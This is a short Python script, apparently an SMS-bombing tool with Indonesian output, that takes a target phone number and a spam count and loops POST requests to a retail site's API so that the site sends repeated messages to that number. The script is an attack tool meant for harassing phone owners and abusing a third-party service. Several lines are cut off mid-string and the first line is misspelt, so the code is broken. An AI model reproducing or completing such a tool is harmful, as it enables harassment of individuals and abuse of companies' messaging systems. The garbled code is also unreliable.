mport json
import requests
import os
import sys

def main():
        os.system('clear')
        os.system('figlet spam sms')
        banner = '''
Subscribing to additional repositories]
'''
        print(banner)
        no = input('Target : ')
        jum = input('Jumlah Spam : ')

        head = {

        "User-Agent": "Mozilla/5.0 (Linux; Android 10>
        "Referer": "https://www.mapclub.com/en/user/s>
        "Host": "cmsapi.mapclub.com",
        }


        dat = {
        'phone': no
        }

        for x in range(int(jum)):
                leosureo = requests.post("https://cms>
                if 'error' in leosureo:
                        print(' Gagal Mengirim '+ no)
                else:
                        print(' Berhasil Mengirim '+ >


main()

